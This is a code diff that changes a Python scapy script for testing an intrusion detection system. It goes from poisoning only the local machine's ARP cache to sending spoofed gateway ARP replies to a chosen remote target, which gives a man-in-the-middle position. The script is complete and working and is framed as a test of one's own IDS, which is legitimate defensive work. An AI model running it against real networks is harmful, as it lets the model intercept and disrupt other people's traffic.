@@ -1,23 +1,27 @@
 """
-ARP spoofing SELF-TEST — for validating this machine's own IDS only.
+ARP spoofing test — for validating YOUR OWN IDS on YOUR OWN network only.
 
-This poisons THIS laptop's ARP cache: it tells this host that the gateway IP
-lives at this same host's MAC, so the IDS (sniffing on the same box) sees a
-gateway IP suddenly answering from a new MAC and should fire an arp_spoofing
-alert. It targets only the loopback of your own setup — the victim IP defaults
-to this machine and the "attacker" MAC is this machine's own MAC.
+Tells a target machine that the gateway is at THIS machine's MAC, so the target
+sends its gateway-bound traffic to us instead (a man-in-the-middle position).
+An IDS sniffing the network sees the gateway IP suddenly answering from a new
+MAC and should fire an arp_spoofing alert.
 
-Intended use: your hardware, your network, testing your own detector.
-Run in a second terminal while src.py is running. Ctrl-C restores the cache.
+Intended use ONLY: your own hardware, your own local network (e.g. two laptops
+on your phone's hotspot), testing your own detector. Do not point this at
+machines or networks you do not own.
 
-    sudo ./venv/bin/python arp_attack_test.py --gateway 10.41.0.1
+Run in a second terminal. Ctrl-C restores the target's ARP cache so its
+connectivity heals.
+
+    sudo ./venv/bin/python arp_attack_test.py --target 192.168.43.50
 """
 import argparse
 import time
-from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, conf
+from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
 
 
 def mac_of(ip, iface):
+    """Resolve an IP's current MAC by asking the network."""
     ans, _ = srp(
         Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
         timeout=3, iface=iface, verbose=0,
@@ -28,9 +32,13 @@ def mac_of(ip, iface):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="ARP spoofing self-test against this machine")
+    parser = argparse.ArgumentParser(
+        description="ARP spoofing test against a chosen host on your own network")
+    parser.add_argument("--target", required=True,
+                        help="IP of the machine to feed the spoofed mapping to "
+                             "(the other laptop running the IDS)")
     parser.add_argument("--gateway", default=None,
-                        help="gateway IP to spoof (default: system's default gateway)")
+                        help="gateway IP to impersonate (default: default gateway)")
     parser.add_argument("--iface", default=None,
                         help="interface to use (default: system's default route)")
     parser.add_argument("--count", type=int, default=20,
@@ -41,38 +49,49 @@ def main():
     default_iface, _, default_gw = conf.route.route("0.0.0.0")
     gateway = args.gateway or default_gw
     iface = args.iface or default_iface
-    args.gateway = gateway
-    args.iface = iface
 
-    victim_ip = conf.route.route(args.gateway)[1]  # this machine's IP on that path
-    attacker_mac = get_if_hwaddr(args.iface)       # this machine's own MAC
+    attacker_mac = get_if_hwaddr(iface)  # this machine's own MAC
 
-    print(f"Interface: {args.iface}")
-    print(f"Victim (this machine): {victim_ip}")
-    print(f"Spoofing gateway {args.gateway} -> claiming it is at {attacker_mac}")
+    print(f"Interface: {iface}")
+    print(f"Target: {args.target}")
+    print(f"Impersonating gateway {gateway} -> claiming it is at {attacker_mac}")
 
-    real_gw_mac = mac_of(args.gateway, args.iface)
-    if real_gw_mac is None:
-        print("Could not resolve the real gateway MAC; is the gateway IP correct?")
+    # We need the target's MAC to address the spoofed reply straight to it, and
+    # the gateway's real MAC to repair the target's cache when we stop.
+    target_mac = mac_of(args.target, iface)
+    if target_mac is None:
+        print(f"Could not reach target {args.target}. Is it on this network, and "
+              f"does the hotspot allow client-to-client traffic (no isolation)?")
         return
 
-    # Tell the victim: "the gateway is at my MAC." Since victim == attacker here,
-    # this poisons only this host's own cache.
-    poison = ARP(op=2, pdst=victim_ip, psrc=args.gateway, hwdst=attacker_mac,
-                 hwsrc=attacker_mac)
+    real_gw_mac = mac_of(gateway, iface)
+    if real_gw_mac is None:
+        print(f"Could not resolve the real gateway MAC for {gateway}.")
+        return
+
+    # Tell the target: "the gateway is at my MAC." Directed straight at the
+    # target (hwdst=target_mac), not broadcast.
+    # Send at layer 2 (sendp + explicit Ether frame) so the reply is delivered
+    # straight to the target's MAC. Plain send() works at layer 3, leaves the
+    # Ethernet destination unset, and may broadcast or drop the packet.
+    poison = (Ether(dst=target_mac, src=attacker_mac) /
+              ARP(op=2, pdst=args.target, hwdst=target_mac,
+                  psrc=gateway, hwsrc=attacker_mac))
     try:
         for i in range(args.count):
-            send(poison, iface=args.iface, verbose=0)
+            sendp(poison, iface=iface, verbose=0)
             print(f"  sent spoofed reply {i + 1}/{args.count}")
             time.sleep(1)
     except KeyboardInterrupt:
         print("\nInterrupted.")
     finally:
-        # Restore: re-announce the gateway's real MAC so the cache heals.
-        print("Restoring correct ARP mapping...")
-        fix = ARP(op=2, pdst=victim_ip, psrc=args.gateway, hwdst=attacker_mac,
-                  hwsrc=real_gw_mac)
-        send(fix, count=5, iface=args.iface, verbose=0)
+        # Restore: re-announce the gateway's real MAC to the target so its cache
+        # heals and its internet connectivity comes back.
+        print("Restoring correct ARP mapping on target...")
+        fix = (Ether(dst=target_mac, src=real_gw_mac) /
+               ARP(op=2, pdst=args.target, hwdst=target_mac,
+                   psrc=gateway, hwsrc=real_gw_mac))
+        sendp(fix, count=5, iface=iface, verbose=0)
         print("Done.")
 
 
